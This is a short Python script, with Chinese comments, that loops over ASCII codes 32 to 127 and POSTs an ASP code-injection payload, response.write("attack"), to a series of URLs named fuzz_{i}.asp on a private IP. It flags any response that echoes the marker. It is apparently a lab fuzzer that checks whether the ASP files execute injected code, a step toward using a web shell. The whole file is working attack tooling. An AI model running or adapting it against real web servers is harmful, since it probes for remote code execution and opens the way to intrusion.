import requests

# 循环遍历ASCII码范围从32到127
for i in range(32, 128):
    # 构造请求的URL
    url = f'http://10.100.18.28/1/fuzz_{i}.asp'
    # 构造POST请求的表单数据
    body_post = {'value': 'value=response.write("attack")'}
    try:
        # 发送POST请求
        r = requests.post(url, data=body_post)
        # 获取响应的文本内容
        content = r.text
        # 检查响应内容中是否包含关键字 "attack"
        if 'attack' in content:
            # 若包含，则打印URL和响应内容
            print(url)
            print(content)
    except requests.RequestException as e:
        # 处理请求异常
        print(f"请求 {url} 时发生错误: {e}")